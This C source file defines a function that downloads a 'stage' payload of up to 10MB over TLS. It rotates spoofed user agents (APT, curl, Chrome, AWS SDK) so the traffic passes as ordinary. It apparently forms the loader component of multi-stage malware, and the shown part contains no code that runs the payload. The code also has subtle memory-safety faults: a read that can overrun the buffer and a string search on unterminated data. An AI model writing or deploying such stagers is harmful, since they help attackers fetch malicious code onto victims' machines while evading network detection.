#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include "network.h"

#define MAX_STAGE_SIZE 10 * 1024 * 1024 // 10MB limit

const char *user_agents[] = {
    "Debian APT-HTTP/1.3 (2.2.4) non-interactive",
    "curl/7.74.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "AWS-SDK-Java/1.11.234 Linux/4.14.225-121.357.amzn2.x86_64"
};

unsigned char* download_stage(const char *host, const char *path, size_t *out_len) {
    SSL_CTX *ctx = NULL;
    SSL *ssl = NULL;
    int sock = -1;
    struct hostent *server;
    struct sockaddr_in serv_addr;
    char request[1024];
    unsigned char *buffer = malloc(MAX_STAGE_SIZE);
    int bytes, total = 0;

    if (!buffer) return NULL;

    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) goto cleanup;

    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION); // TLS 1.2+ para compatibilidad

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) goto cleanup;

    server = gethostbyname(host);
    if (!server) goto cleanup;

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    serv_addr.sin_port = htons(443);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) goto cleanup;

    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) <= 0) goto cleanup;

    const char *ua = user_agents[rand() % 4];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Connection: close\r\n\r\n", path, host, ua);

    SSL_write(ssl, request, strlen(request));

    while (total < MAX_STAGE_SIZE && (bytes = SSL_read(ssl, buffer + total, 4096)) > 0) {
        total += bytes;
    }

    char *body_start = strstr((char *)buffer, "\r\n\r\n");
    if (body_start) {
        body_start += 4;
        *out_len = total - (body_start - (char *)buffer);
        unsigned char *result = malloc(*out_len);
        if (result) {
            memcpy(result, body_start, *out_len);
            free(buffer);
            SSL_free(ssl);
            close(sock);
            SSL_CTX_free(ctx);
            return result;
        }
    }

cleanup:
    if (buffer) free(buffer);
    if (ssl) SSL_free(ssl);
    if (sock != -1) close(sock);
    if (ctx) SSL_CTX_free(ctx);
    return NULL;
}
